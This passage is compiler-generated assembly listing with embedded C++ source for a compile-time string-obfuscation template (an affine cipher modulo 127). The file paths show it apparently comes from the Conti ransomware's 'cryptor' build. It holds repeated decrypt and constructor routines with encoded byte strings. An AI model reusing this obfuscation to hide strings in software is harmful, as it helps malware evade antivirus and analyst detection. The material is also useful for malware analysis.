  00067	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006b	49 83 ea 01	 sub	 r10, 1
  0006f	75 af		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00071	49 8b c0	 mov	 rax, r8
  00074	c3		 ret	 0
?decrypt@?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 1d	 mov	 BYTE PTR [rcx+1], 29
  00007	c6 41 02 58	 mov	 BYTE PTR [rcx+2], 88	; 00000058H
  0000b	c6 41 03 27	 mov	 BYTE PTR [rcx+3], 39	; 00000027H
  0000f	c6 41 04 58	 mov	 BYTE PTR [rcx+4], 88	; 00000058H
  00013	c6 41 05 1a	 mov	 BYTE PTR [rcx+5], 26
  00017	c6 41 06 58	 mov	 BYTE PTR [rcx+6], 88	; 00000058H
  0001b	c6 41 07 0c	 mov	 BYTE PTR [rcx+7], 12
  0001f	c6 41 08 58	 mov	 BYTE PTR [rcx+8], 88	; 00000058H
  00023	c6 41 09 58	 mov	 BYTE PTR [rcx+9], 88	; 00000058H
  00027	c6 41 0a 58	 mov	 BYTE PTR [rcx+10], 88	; 00000058H
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$06$0FI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<7,88,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 09 00 00 00	 mov	 eax, 9
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 17	 imul	 ecx, eax, 23

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 07	 mov	 BYTE PTR [rcx+1], 7
  00007	c6 41 02 09	 mov	 BYTE PTR [rcx+2], 9
  0000b	c6 41 03 30	 mov	 BYTE PTR [rcx+3], 48	; 00000030H
  0000f	c6 41 04 09	 mov	 BYTE PTR [rcx+4], 9
  00013	c6 41 05 78	 mov	 BYTE PTR [rcx+5], 120	; 00000078H
  00017	c6 41 06 09	 mov	 BYTE PTR [rcx+6], 9
  0001b	c6 41 07 2b	 mov	 BYTE PTR [rcx+7], 43	; 0000002bH
  0001f	c6 41 08 09	 mov	 BYTE PTR [rcx+8], 9
  00023	c6 41 09 09	 mov	 BYTE PTR [rcx+9], 9
  00027	c6 41 0a 09	 mov	 BYTE PTR [rcx+10], 9
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0L@$08U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<11,9,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 49 01	 lea	 r9, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 68		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b d1	 mov	 r10, r9
  0000e	41 bb 0c 00 00
	00		 mov	 r11d, 12
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 0a	 movzx	 ecx, BYTE PTR [r10]
  00024	4d 8d 52 01	 lea	 r10, QWORD PTR [r10+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	83 e9 54	 sub	 ecx, 84			; 00000054H

; 40   :     return (a % n + n) % n;

  0002b	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00030	44 6b c1 13	 imul	 r8d, ecx, 19

; 40   :     return (a % n + n) % n;

  00034	41 f7 e8	 imul	 r8d
  00037	41 03 d0	 add	 edx, r8d
  0003a	c1 fa 06	 sar	 edx, 6
  0003d	8b c2		 mov	 eax, edx
  0003f	c1 e8 1f	 shr	 eax, 31
  00042	03 d0		 add	 edx, eax
  00044	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00047	44 2b c0	 sub	 r8d, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00053	41 f7 e8	 imul	 r8d
  00056	41 03 d0	 add	 edx, r8d
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00069	45 88 42 ff	 mov	 BYTE PTR [r10-1], r8b
  0006d	49 83 eb 01	 sub	 r11, 1
  00071	75 ad		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00073	49 8b c1	 mov	 rax, r9
  00076	c3		 ret	 0
?decrypt@?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 35	 mov	 BYTE PTR [rcx+1], 53	; 00000035H
  00007	c6 41 02 54	 mov	 BYTE PTR [rcx+2], 84	; 00000054H
  0000b	c6 41 03 75	 mov	 BYTE PTR [rcx+3], 117	; 00000075H
  0000f	c6 41 04 54	 mov	 BYTE PTR [rcx+4], 84	; 00000054H
  00013	c6 41 05 3f	 mov	 BYTE PTR [rcx+5], 63	; 0000003fH
  00017	c6 41 06 54	 mov	 BYTE PTR [rcx+6], 84	; 00000054H
  0001b	c6 41 07 74	 mov	 BYTE PTR [rcx+7], 116	; 00000074H
  0001f	c6 41 08 54	 mov	 BYTE PTR [rcx+8], 84	; 00000054H
  00023	c6 41 09 1d	 mov	 BYTE PTR [rcx+9], 29
  00027	c6 41 0a 54	 mov	 BYTE PTR [rcx+10], 84	; 00000054H
  0002b	c6 41 0b 54	 mov	 BYTE PTR [rcx+11], 84	; 00000054H
  0002f	c6 41 0c 54	 mov	 BYTE PTR [rcx+12], 84	; 00000054H
  00033	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00037	48 8b c1	 mov	 rax, rcx
  0003a	c3		 ret	 0
??0?$MetaBuffer@$0GL@$0FE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >::MetaBuffer<107,84,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 67		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 13 00 00 00	 mov	 eax, 19
  0002d	2b c1		 sub	 eax, ecx
  0002f	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00037	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  0003a	f7 e9		 imul	 ecx
  0003c	03 d1		 add	 edx, ecx
  0003e	c1 fa 06	 sar	 edx, 6
  00041	8b c2		 mov	 eax, edx
  00043	c1 e8 1f	 shr	 eax, 31
  00046	03 d0		 add	 edx, eax
  00048	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  0004b	2b c8		 sub	 ecx, eax
  0004d	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00052	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00055	f7 e9		 imul	 ecx
  00057	03 d1		 add	 edx, ecx
  00059	c1 fa 06	 sar	 edx, 6
  0005c	8b c2		 mov	 eax, edx
  0005e	c1 e8 1f	 shr	 eax, 31
  00061	03 d0		 add	 edx, eax
  00063	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00066	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00068	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  0006c	49 83 ea 01	 sub	 r10, 1
  00070	75 ae		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  00072	49 8b c0	 mov	 rax, r8
  00075	c3		 ret	 0
?decrypt@?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 35	 mov	 BYTE PTR [rcx+1], 53	; 00000035H
  00007	c6 41 02 13	 mov	 BYTE PTR [rcx+2], 19
  0000b	c6 41 03 76	 mov	 BYTE PTR [rcx+3], 118	; 00000076H
  0000f	c6 41 04 13	 mov	 BYTE PTR [rcx+4], 19
  00013	c6 41 05 73	 mov	 BYTE PTR [rcx+5], 115	; 00000073H
  00017	c6 41 06 13	 mov	 BYTE PTR [rcx+6], 19
  0001b	c6 41 07 6c	 mov	 BYTE PTR [rcx+7], 108	; 0000006cH
  0001f	c6 41 08 13	 mov	 BYTE PTR [rcx+8], 19
  00023	c6 41 09 13	 mov	 BYTE PTR [rcx+9], 19
  00027	c6 41 0a 13	 mov	 BYTE PTR [rcx+10], 19
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$0ED@$0BD@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<67,19,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
?decrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]
  00003	4c 8d 41 01	 lea	 r8, QWORD PTR [rcx+1]

; 63   :         if (!isDecrypted())

  00007	84 c0		 test	 al, al
  00009	75 64		 jne	 SHORT $LN17@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  0000b	4d 8b c8	 mov	 r9, r8
  0000e	41 ba 0a 00 00
	00		 mov	 r10d, 10
  00014	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL4@decrypt:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00020	41 0f b6 09	 movzx	 ecx, BYTE PTR [r9]
  00024	4d 8d 49 01	 lea	 r9, QWORD PTR [r9+1]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00028	b8 18 00 00 00	 mov	 eax, 24
  0002d	2b c1		 sub	 eax, ecx
  0002f	6b c8 2a	 imul	 ecx, eax, 42		; 0000002aH

; 40   :     return (a % n + n) % n;

  00032	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00037	f7 e9		 imul	 ecx
  00039	03 d1		 add	 edx, ecx
  0003b	c1 fa 06	 sar	 edx, 6
  0003e	8b c2		 mov	 eax, edx
  00040	c1 e8 1f	 shr	 eax, 31
  00043	03 d0		 add	 edx, eax
  00045	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00048	2b c8		 sub	 ecx, eax
  0004a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0004f	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00052	f7 e9		 imul	 ecx
  00054	03 d1		 add	 edx, ecx
  00056	c1 fa 06	 sar	 edx, 6
  00059	8b c2		 mov	 eax, edx
  0005b	c1 e8 1f	 shr	 eax, 31
  0005e	03 d0		 add	 edx, eax
  00060	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00063	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00065	41 88 49 ff	 mov	 BYTE PTR [r9-1], cl
  00069	49 83 ea 01	 sub	 r10, 1
  0006d	75 b1		 jne	 SHORT $LL4@decrypt
$LN17@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }

  0006f	49 8b c0	 mov	 rax, r8
  00072	c3		 ret	 0
?decrypt@?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
this$ = 8
data$dead$ = 16
??0?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 23	 mov	 BYTE PTR [rcx+1], 35	; 00000023H
  00007	c6 41 02 18	 mov	 BYTE PTR [rcx+2], 24
  0000b	c6 41 03 7c	 mov	 BYTE PTR [rcx+3], 124	; 0000007cH
  0000f	c6 41 04 18	 mov	 BYTE PTR [rcx+4], 24
  00013	c6 41 05 7c	 mov	 BYTE PTR [rcx+5], 124	; 0000007cH
  00017	c6 41 06 18	 mov	 BYTE PTR [rcx+6], 24
  0001b	c6 41 07 7c	 mov	 BYTE PTR [rcx+7], 124	; 0000007cH
  0001f	c6 41 08 18	 mov	 BYTE PTR [rcx+8], 24
  00023	c6 41 09 18	 mov	 BYTE PTR [rcx+9], 24
  00027	c6 41 0a 18	 mov	 BYTE PTR [rcx+10], 24
  0002b	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  0002f	48 8b c1	 mov	 rax, rcx
  00032	c3		 ret	 0
??0?$MetaBuffer@$02$0BI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<3,24,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CJ@$0DJ@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
this$ = 8
